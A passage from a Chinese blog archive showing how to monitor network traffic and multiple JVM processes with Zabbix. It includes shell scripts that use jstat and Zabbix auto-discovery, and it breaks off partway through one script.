"$n_new-$n_old"|bc` d_new=`date +%s` d_old=`tail -2 /tmp/neti.log|head -1` d=`echo "$d_new-$d_old"|bc` if_net=`echo "$n/$d"|bc` echo $if_net date +%s&gt;&gt;/tmp/neti.log grep "$eth" $net_file|awk '&#123;print $2&#125;'&gt;&gt;/tmp/neti.logelif [ $2 == "out" ]then n_new=`grep "$eth" $net_file|awk '&#123;print $10&#125;'` n_old=`tail -1 /tmp/neto.log` n=`echo "$n_new-$n_old"|bc` d_new=`date +%s` d_old=`tail -2 /tmp/neto.log|head -1` d=`echo "$d_new-$d_old"|bc` if_net=`echo "$n/$d"|bc` echo $if_net date +%s&gt;&gt;/tmp/neto.log grep "$eth" $net_file|awk '&#123;print $10&#125;'&gt;&gt;/tmp/neto.logelse echo 0fi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个脚本的思路，就是通过查看文件 /proc/net/dev 里面的数值，来计算实时网卡流量，其实我算的是一个平均值。分为进和出。如果这个脚本每隔1分钟执行一次，那么算出来的流量值就是1分钟的平均值。 在脚本执行前，需要先做一个操作 123456touch /tmp/net[io].logdate +%s &gt;&gt;/tmp/neti.loggrep eth0 /proc/net/dev |awk '&#123;print $2&#125;' &gt;&gt;/tmp/neti.logdate +%s &gt;&gt;/tmp/neto.loggrep eth0 /proc/net/dev |awk '&#123;print $10&#125;' &gt;&gt;/tmp/neto.logchown zabbix /tmp/net[io].log 检查脚本是否可用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在服务端执行 1zabbix_get -s 192.168.31.166 -p10050 -k "my.net.if[eth0,out]" 如果可以返回数值说明没问题了，接着在浏览器里面配置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组态 –&gt; 主机 –&gt; 项目 –&gt; 创建监控项 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;名称 “网卡流量出” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;类型默认“zabbix代理” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;键值 “my.net.if[eth0,out]” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据更新间隔 60 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;存档]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix使用自动发现功能监控服务器各JVM进程状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F6.%20zabbix%E4%BD%BF%E7%94%A8%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0%E5%8A%9F%E8%83%BD%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%84JVM%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[zabbix使用自动发现功能监控服务器各JVM进程状态前言&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么需要做服务器jvm自动发现的监控呢？这个事情主要有两点原因： zabbix默认监控jvm状态是使用jmx中转进行监控的，监控效率比较低下 zabbix使用jmx监控jvm的时候由于一个主机上的键值不能重复，也就导致了一台主机上只能监控一个jvm实例 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两点原因导致zabbix通过jmx监控jvm的实现不是很理想，加上最近老大要求收集服务器上面跑的所有java应用的信息，于是自己琢磨了下，还是自己动手，丰衣足食。利用了周末的时间，通过使用shell脚本+java工具jstat+zabbix实现监控主机上多jvm实例的功能。 一、概念的理解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，既然要监控jvm状态，那就必须要了解jvm里面的信息，楼主通过搜索资料加自动脑补，把网上的资料取其精华，去其糟粕，整理了一下。JVM中的内存分类分为堆内存和非堆内存，堆内存是给实际应用使用的，非堆内存是给jvm容器使用的。我们主要关心的是堆内存这块。在堆内存里面，给内存分为如下几块： Young代（年轻代） Old代（老年代） Perm代（永久代）（关于这一点，在JDK7和JDK8中情况不一样，将在后面进行分析） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，年轻代里面又分成了三块，如下： Eden代（伊甸园代） survivor0代（0号幸存区） survivor1代（1号幸存区） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至于更详细的关于JVM堆内存的信息，各位可以自行百度或者google，我这里就不赘述了，毕竟我也是个半桶水，自己找了点资料外加脑补到的一些东西，不敢在关公门前耍大刀了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，还得科普一个东西，那就是GC，所谓的GC就是JVM在运行的时候会有一个垃圾回收机制，这个垃圾回收机制是什么情况呢？就是在程序运行的时候会产生很多已经不使用的空间，但还是被占用了的情况，这样会造成很多不必要的浪费，于是JVM就有一个垃圾回收机制，针对程序中已经不使用的内存资源，会进行回收释放，这个过程就叫做GC。当然，关于GC还有很多内容我这里也没有详述，理由同上条。各位看官只需要知道GC是JVM监控里面的一个很重要的参数就行了。 二、JAVA工具的选用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;java工具有很多，关于jvm监控的工具主要有如下几个： jstat jmap jstack &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中jmap –heap pid可以抓出挺多的关于某个jvm的运行参数，但是老大提醒我最好不要使用jmap进行jvm监控，具体没有说明原因。于是本着打破砂锅问到底的精神，我又去搜了一把，发现了如下内容： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;jmap最主要的危险操作是下面这三种： jmap -dump &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令执行，JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，并且执行的过程中为了保证dump的信息是可靠的，所以会暂停应用。 jmap -permstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令执行，JVM会去统计perm区的状况，这整个过程也会比较的耗时，并且同样也会暂停应用。 jmap -histo:live &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令执行，JVM会先触发gc，然后再统计信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的这三个操作都将对应用的执行产生影响，所以建议如果不是很有必要的话，不要去执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，从上面三点来看，jmap命令对jvm状态影响还是比较大的，而且执行jmap –heap的时间也比较长，效率较低，予以排除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来是jstack，这个命令可以深入到JVM里面对JVM运行问题进行排查，据说还可以统计JVM里面的线程数量。但是这个命令执行效率也比较低，被排除掉了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;于是剩下的只有一个jstat命令了。下面来详细的讲解该命令的使用了，咳咳，各位快点打起点精神来，这可是重头戏来了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，列出jstat命令的一些使用案例吧： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374============================================1.jstat -gc pid可以显示gc的信息，查看gc的次数，及时间。其中最后五项，分别是young gc的次数，young gc的时间，full gc的次数，full gc的时间，gc的总时间。S0C S1C S0U S1U EC EU OC OU PC PU YGC YGCT FGC FGCT GCT 9792.0 10048.0 0.0 5143.2 242048.0 220095.4 323200.0 211509.3 186368.0 114451.6 317 4.850 4 0.971 5.821S0C S1C S0U S1U EC EU OC OU MC MU CCSC CCSU YGC YGCT FGC FGCT GCT 1024.0 1024.0 0.0 320.0 11776.0 11604.6 260608.0 149759.6 39344.0 38142.6 4528.0 4303.1 5473 24.010 2 0.128 24.1382.jstat -gccapacity pid可以显示，VM内存中三代（young,old,perm）对象的使用和占用大小，如 PGCMN显示的是最小perm的内存使用量，PGCMX显示的是perm的内存最大使用量，PGC是当前新生成的perm内存占用量，PC是但前perm内存占用量。其他的可以根据这个类推， OC是old内纯的占用量。NGCMN NGCMX NGC S0C S1C EC OGCMN OGCMX OGC OC PGCMN PGCMX PGC PC YGC FGC 87360.0 262144.0 262144.0 9792.0 10048.0 242048.0 174784.0 786432.0 323200.0 323200.0 131072.0 262144.0 186368.0 186368.0 317 4NGCMN NGCMX NGC S0C S1C EC OGCMN OGCMX OGC OC MCMN MCMX MC CCSMN CCSMX CCSC YGC FGC 1536.0 174592.0 13312.0 512.0 512.0 11776.0 260608.0 349696.0 260608.0 260608.0 0.0 1083392.0 39344.0 0.0 1048576.0 4528.0 5474 23.jstat -gcutil pid统计gc信息统计。S0 S1 E O P YGC YGCT FGC FGCT GCT 0.00 51.19 83.29 65.44 61.41 317 4.850 4 0.971 5.821S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 68.75 0.00 46.74 57.47 96.95 95.03 5474 24.014 2 0.128 24.1434.jstat -gcnew pid年轻代对象的信息。S0C S1C S0U S1U TT MTT DSS EC EU YGC YGCT 9792.0 10048.0 0.0 5143.2 3 15 9792.0 242048.0 198653.2 317 4.850S0C S1C S0U S1U TT MTT DSS EC EU YGC YGCT 512.0 512.0 352.0 0.0 15 15 512.0 11776.0 8446.4 5474 24.0145.jstat -gcnewcapacity pid年轻代对象的信息及其占用量。NGCMN NGCMX NGC S0CMX S0C S1CMX S1C ECMX EC YGC FGC 87360.0 262144.0 262144.0 87360.0 9792.0 87360.0 10048.0 262016.0 242048.0 317 4NGCMN NGCMX NGC S0CMX S0C S1CMX S1C ECMX EC YGC FGC 1536.0 174592.0 13312.0 57856.0 512.0 57856.0 512.0 173568.0 11776.0 5475 26.jstat -gcold pidold代对象的信息。PC PU OC OU YGC FGC FGCT GCT 186368.0 114451.6 323200.0 211509.3 317 4 0.971 5.821MC MU CCSC CCSU OC OU YGC FGC FGCT GCT 39344.0 38142.6 4528.0 4303.1 260608.0 149783.6 5475 2 0.128 24.1487.jstat -gcoldcapacity pidold代对象的信息及其占用量。OGCMN OGCMX OGC OC YGC FGC FGCT GCT 174784.0 786432.0 323200.0 323200.0 317 4 0.971 5.821OGCMN OGCMX OGC OC YGC FGC FGCT GCT 260608.0 349696.0 260608.0 260608.0 5475 2 0.128 24.1488.jstat -gcpermcapacity pidperm对象的信息及其占用量。PGCMN PGCMX PGC PC YGC FGC FGCT GCT 131072.0 262144.0 186368.0 186368.0 317 4 0.971 5.821没有9.jstat -class pid显示加载class的数量，及所占空间等信息。Loaded Bytes Unloaded Bytes Time 25315 45671.7 5976 7754.1 15.19Loaded Bytes Unloaded Bytes Time 6472 11893.0 0 0.0 5.9710.jstat -compiler pid显示VM实时编译的数量等信息。Compiled Failed Invalid Time FailedType FailedMethod4219 3 0 63.36 1 org/aspectj/weaver/ResolvedType addAndRecurseCompiled Failed Invalid Time FailedType FailedMethod11364 1 0 107.53 1 sun/nio/cs/UTF_8$Decoder decode11.stat -printcompilation pid当前VM执行的信息。Compiled Size Type Method4219 2232 1 net/spy/memcached/protocol/ascii/BaseGetOpImpl initializeCompiled Size Type Method11364 212 1 com/alibaba/rocketmq/client/impl/consumer/RebalanceService run================================================== &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看出上面我列出的命令执行结果为什么有两行呢，这是因为是用不同的jdk版本执行的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面是JDK7执行结果，下面是JDK8执行结果，这两个版本之间输出的结果是有差距的，下面，就来分析为什么会产生这种差异。 JDK7和JDK8中JVM堆内存划分差异&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果记性好的童鞋们应该还能记得我上面在介绍JVM堆内存分类的时候括号里写的那个东东吧，没错，就是这个东西导致的。在JDK7中的Perm代（永久代）在JDK8中被废除了，取而代之的是Metadata代（元数据代），据说这个元数据代相对于永久代进行了优化，如果不设置最大值的话，默认会按需增长， 不会造成像Perm代中内存占满后会爆出内存溢出的错误，元数据代也可以设置最大值，这样的话，当内存区域被消耗完的时候将会和Perm代一样爆出内存溢出的错误。（PS:原谅我的班门弄斧，只能解释到这一个层面了。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，解释清楚了JDK7和JDK8的差异以后，接下来我们来解释jstat抓到的这些参数了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960jstat命令获取参数解析======================================================================================* S0C 年轻代中第一个survivor（幸存区）的容量 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $1*1024&#125;'* S0U 年轻代中第一个survivor（幸存区）目前已使用空间 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $3*1024&#125;'* S0 年轻代中第一个survivor（幸存区）已使用的占当前容量百分比jstat -gcutil $pid|tail -1|awk '&#123;print $1&#125;'* S0CMX 年轻代中第一个survivor（幸存区）的最大容量 (字节)jstat -gcnewcapacity $pid|tail -1|awk '&#123;print $4*1024&#125;'* * S1C 年轻代中第二个survivor（幸存区）的容量 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $2*1024&#125;'* S1U 年轻代中第二个survivor（幸存区）目前已使用空间 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $4*1024&#125;'* S1 年轻代中第二个survivor（幸存区）已使用的占当前容量百分比jstat -gcutil $pid|tail -1|awk '&#123;print $2&#125;'* S1CMX 年轻代中第二个survivor（幸存区）的最大容量 (字节)jstat -gcnewcapacity $pid|tail -1|awk '&#123;print $6*1024&#125;'* DSS 当前需要survivor（幸存区）的容量 (字节)（Eden区已满）jstat -gcnew $pid|tail -1|awk '&#123;print $7*1024&#125;'* * EC 年轻代中Eden（伊甸园）的容量 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $8*1024&#125;'* EU 年轻代中Eden（伊甸园）目前已使用空间 (字节)jstat -gcnew $pid|tail -1|awk '&#123;print $9*1024&#125;'* ECMX 年轻代中Eden（伊甸园）的最大容量 (字节)jstat -gcnewcapacity $pid|tail -1|awk '&#123;print $8*1024&#125;'* E 年轻代中Eden（伊甸园）已使用的占当前容量百分比jstat -gcutil $pid|tail -1|awk '&#123;print $3&#125;'* * NGCMN 年轻代(young)中初始化(最小)的大小 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $1*1024&#125;'* NGCMX 年轻代(young)的最大容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $2*1024&#125;'* NGC 年轻代(young)中当前的容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $3*1024&#125;'* * OC Old代的容量 (字节)jstat -gcold $pid|tail -1|awk '&#123;print $3*1024&#125;'* OU Old代目前已使用空间 (字节)jstat -gcold $pid|tail -1|awk '&#123;print $4*1024&#125;'* OGCMX old代的最大容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $8*1024&#125;'* OGCMN old代中初始化(最小)的大小 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $7*1024&#125;'* O old代已使用的占当前容量百分比jstat -gcutil $pid|tail -1|awk '&#123;print $4&#125;'* OGC old代当前新生成的容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $9*1024&#125;'* * PC Perm(持久代)的容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $14*1024&#125;'* PU Perm(持久代)目前已使用空间 (字节)jstat -gc $pid|tail -1|awk '&#123;print $10*1024&#125;'* PGCMX perm代的最大容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $12*1024&#125;'* PGCMN perm代中初始化(最小)的大小 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $11*1024&#125;'* P perm代已使用的占当前容量百分比 jstat -gcutil $pid|tail -1|awk '&#123;print $5*1024&#125;'* PGC perm代当前新生成的容量 (字节)jstat -gccapacity $pid|tail -1|awk '&#123;print $13*1024&#125;'* * YGC 从应用程序启动到采样时年轻代中gc次数jstat -gccapacity $pid|tail -1|awk '&#123;print $15&#125;'* YGCT 从应用程序启动到采样时年轻代中gc所用时间(s)jstat -gcutil $pid|tail -1|awk '&#123;print $7&#125;'* FGC从应用程序启动到采样时old代(全gc)gc次数jstat -gccapacity $pid|tail -1|awk '&#123;print $16&#125;'* FGCT 从应用程序启动到采样时old代(全gc)gc所用时间(s)jstat -gcutil $pid|tail -1|awk '&#123;print $9&#125;'* GCT 从应用程序启动到采样时gc用的总时间(s)jstat -gcutil $pid|tail -1|awk '&#123;print $10&#125;'* * TT 持有次数限制jstat -gcnew $pid|tail -1|awk '&#123;print $5&#125;'* MTT 最大持有次数限制jstat -gcnew $pid|tail -1|awk '&#123;print $6&#125;'** Loadedjvm加载class数量* Unloadedjvm未加载class数量** M元数据区使用比例* MC当前元数据空间大小* MU元数据空间使用大小* MCMN最小元数据容量 * MCMX最大元数据容量* * CCS压缩使用比例* CCSC当前压缩类空间大小* CCSU压缩类空间使用大小* CCSMN最小压缩类空间大小* CCSMX最大压缩类空间大小==================================================== &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，上面就是我找到的一些对jstat获取的数据意思的统计，各位看官可以做个参考。好了，这一章的内容到此基本结束，前面的东西都是一些理论类的东西，没有实际的操作。俗话说，光说不练假把式。接下来，我们将开启下一章的旅程，脚本+jstat的使用。 三、脚本+jstat获取数据首先，我们来看一下该章节介绍的几个脚本吧： jvm_list.sh 获取该机器上所有运行的JVM的进程对应的程序根目录以及程序名称 get_jvmlist.sh 将获取的该机器上的所有进程对应的程序名称序列化成json格式并发送给zabbix服务器 get_jvmstatus.sh 通过获取的程序根目录获取到对应的程序进程，再通过jstat抓取数据写入到文件中缓存 set_jvmstatus.sh zabbix通过调用该脚本获取缓存文件中的关于某个JVM进程的状态信息 简单介绍了上面几个脚本的功能，下面我们列出这几个脚本的实际内容：1234567891011121314151617181920cat jvm_list.sh #!/bin/bash packagePath=/usr/local/etc/scripts/package_path.txt echo -n &gt;$packagePath for i in `ps -fC java|tail -n +2|grep -v 'flume'|awk '&#123;print $2&#125;'`; do pgrootpath=`ls -l /proc/$i/cwd|awk '&#123;print $NF&#125;'` if [[ -r $pgrootpath/appconfig ]] &amp;&amp; [ `grep ^packagename= $pgrootpath/appconfig|wc -l`==1 ];then packagename=$(grep ^packagename= $pgrootpath/appconfig 2&gt;/dev/null|awk -F'"' '&#123;print $2&#125;') elif [[ -r $pgrootpath/webconfig ]] &amp;&amp; [ `grep ^packagename= $pgrootpath/webconfig|wc -l`==1 ];then packagename=$(grep ^packagename= $pgrootpath/webconfig 2&gt;/dev/null|awk -F'"' '&#123;print $2&#125;') else packagename=$(basename $pgrootpath)-1.0.0-bin.tar.gz fi echo "$packagename $pgrootpath" &gt;&gt; $packagePath done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该脚本的目的是先通过使用ps -fC java命令获取该机器上面除了flume进程外的所有其他java进程（我这边使用的是flume来收集业务日志的。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，通过获取到的PID使用ll /proc/pid/cwd命令获取该进程的程序根目录，后面那些判断是获取该进程对应的包名（这一步各位可以根据自己公司的情况自行修改，我这边取包名的方式并不能够匹配各位公司的设置，在下爱莫能助了。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后是将获取到的程序根目录和包名存放在变量packagePath对应的文件中。 123456789101112131415cat get_jvmlist.sh #!/bin/bash TABLESPACE=`awk '&#123;print $1&#125;' /usr/local/etc/scripts/package_path.txt` COUNT=`echo "$TABLESPACE" |wc -l` INDEX=0 echo '&#123;"data":[' echo "$TABLESPACE" | while read LINE; do echo -n '&#123;"&#123;#TABLENAME&#125;":"'$LINE'"&#125;' INDEX=`expr $INDEX + 1` if [ $INDEX -lt $COUNT ]; then echo ',' fi done echo ']&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个脚本的作用就是通过读取文件里面的包名，然后将包名进行json序列化输出，没什么好讲的，套路套一个循环脚本就行。接下来就是重要的脚本了，调用jstat获取JVM状态，并缓存到文件中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cat get_jvmstatus.sh #!/bin/bash MAINCLASS="*Main.class" scriptPath=/usr/local/etc/scripts cat $scriptPath/package_path.txt|while read line do packageName=$(echo $line|awk '&#123;print $1&#125;') pgRootPath=$(echo $line|awk '&#123;print $2&#125;') if [[ -d $pgRootPath/tomcat ]];then pid=$(cat $pgRootPath/tomcat/tomcat.pid) else mainPath=$(find $pgRootPath -name $MAINCLASS) appName=$(echo $&#123;mainPath##*classes/&#125;|sed 's#/#.#g'|sed 's#.class##g') pid=$(ps -fC java|grep "$appName"|awk '&#123;print $2&#125;') fi javaHome=/usr/local/java/jdk1.8.0 #javaHome=/usr/local/java/latest #if [[ -r $pgRootPath/appconfig ]] &amp;&amp; [ `grep ^JAVA_HOME= $pgRootPath/appconfig|wc -l` == 1 ] &amp;&amp; [ `grep ^JAVA_HOME= $pgRootPath/appconfig|grep 8|wc -l` == 1 ];then #javaHome=$(grep ^JAVA_HOME= $pgRootPath/appconfig 2&gt;/dev/null|awk -F'=' '&#123;print $2&#125;') #javaHome=/usr/local/java/jdk1.8.0 #else # if [[ -r $pgRootPath/webconfig ]] &amp;&amp; [ `grep ^'export JAVA_HOME=' $pgRootPath/webconfig|wc -l` == 1 ] &amp;&amp; [ `grep ^'export JAVA_HOME=' $pgRootPath/webconfig|grep 8|wc -l` == 1 ];then # #javaHome=$(grep ^'export JAVA_HOME=' $pgRootPath/webconfig 2&gt;/dev/null|awk -F'"' '&#123;print $2&#125;') # javaHome=/usr/local/java/jdk1.8.0 #fi #fi #echo --------------------------------$pgRootPath #echo $javaHome echo -------------------------------$pid sleep 5 #echo -n &gt;$scriptPath/package/$packageName #$javaHome/bin/jstat -gccapacity $pid &gt; ./package/$packageName 2&gt;/dev/null #$javaHome/bin/jmap -heap $pid&gt;&gt;./package/$packageName 2&gt;/dev/null echo gcnew &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -gcnew $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo gcutil &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -gcutil $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo gcnewcapacity &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -gcnewcapacity $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo gccapacity &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -gccapacity $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null #echo gcold &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null #$javaHome/bin/jstat -gcold $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo gc &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -gc $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo class &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null $javaHome/bin/jstat -class $pid &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo cpu &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo -e "CPU\n$( ps aux|grep $pid|grep -v grep|awk '&#123;print $3&#125;')" &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo mem &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null echo -e "MEM\n$( ps aux|grep $pid|grep -v grep|awk '&#123;print $6&#125;')" &gt;&gt; $scriptPath/package/$packageName 2&gt;/dev/null done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里面首先是通过获取到程序的根目录，然后我这的java程序除了tomcat跑的之外，其他的java程序都是通过Main.class启动的，所以可以获取到AppName，这样通过ps命令就能找到其对应的PID了，而如果是tomcat启动的进程的话，在程序根目录下面的tomcat目录下有一个tomcat.pid文件里面有该程序的PID。后面被注释的那一端代码其实之前是加上去的，那段代码的作用是判断该进程使用的是JDK7还是JDK8启动的，当初的计划是想着如果是JDK7启动的进程就用JDK7的jstat去获取数据，如果是JDK8启动的进程就用JDK8的jstat去获取数据，后来发现不同版本的JDK获取的数据格式不同，于是。。。。。。后悔莫及的把那段代码注释掉了。后面综合公司实际情况考虑，JDK8的程序用得比较多，JDK7的程序相对来说比较少，并且慢慢都会向JDK8进行转换，所以，权衡利弊之下，之后将jstat的JDK全部换成了JDK8，这样的影响就是获取不到JDK7的永久代数据。当然，各位有兴趣的话，也可以JDK7和JDK8同时使用，在过滤输出文件的时候加一个标志位进行判断，当然，我这里暂时没有做这方面的修改。。。毕竟时间有限。。。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四个脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160cat set_jvmstatus.sh #!/bin/bash packageName=$1 key=$2 if [ $2 == "S0C" -o $2 == "S0U" -o $2 == "S1C" -o $2 == "S1U" -o $2 == "DSS" -o $2 == "EC" -o $2 == "EU" ];then part=gcnew elif [ $2 == "S0" -o $2 == "S1" -o $2 == "E" -o $2 == "O" -o $2 == "M" -o $2 == "CCS" -o $2 == "YGCT" -o $2 == "FGCT" -o $2 == "GCT" ];then part=gcutil elif [ $2 == "S0CMX" -o $2 == "S1CMX" -o $2 == "ECMX" ];then part=gcnewcapacity elif [ $2 == "NGCMN" -o $2 == "NGCMX" -o $2 == "NGC" -o $2 == "OGCMX" -o $2 == "OGCMN" -o $2 == "OGC" -o $2 == "MCMN" -o $2 == "MCMX" -o $2 == "MC" -o $2 == "CCSMN" -o $2 == "CCSMX" -o $2 == "CCSC" -o $2 == "YGC" -o $2 == "FGC" ];then part=gccapacity elif [ $2 == "MU" -o $2 == "CCSU" -o $2 == "OC" -o $2 == "OU" ];then part=gc elif [ $2 == "Loaded" -o $2 == "Unloaded" ];then part=class elif [ $2 == "CPU" ];then part=cpu elif [ $2 == "MEM" ];then part=mem else echo "Error input:" exit 0 fi case $2 in S0C) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $1*1024&#125;' ;; S0U) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $3*1024&#125;' ;; S0) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $0&#125;' ;; S0CMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $4*1024&#125;' ;; S1C) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $2*1024&#125;' ;; S1U) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $4*1024&#125;' ;; S1) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $2&#125;' ;; S1CMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $6*1024&#125;' ;; DSS) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $7*1024&#125;' ;; EC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $8*1024&#125;' ;; EU) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $9*1024&#125;' ;; ECMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $8*1024&#125;' ;; E) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $3&#125;' ;; NGCMN) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $1*1024&#125;' ;; NGCMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $2*1024&#125;' ;; NGC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $3*1024&#125;' ;; OC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $7*1024&#125;' ;; OU) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $8*1024&#125;' ;; OGCMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $8*1024&#125;' ;; OGCMN) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $7*1024&#125;' ;; O) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $4&#125;' ;; OGC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $9*1024&#125;' ;; M) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $5&#125;' ;; MC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $13*1024&#125;' ;; MU) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $10*1024&#125;' ;; MCMN) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $11*1024&#125;' ;; MCMX) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%d\n", $12*1024&#125;' ;; CCS) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf "%f\n", $6&#125;' ;; CCSC) grep -wA 2 ^"$part" /usr/local/etc/scripts/package/$1|tail -1|awk '&#123;printf 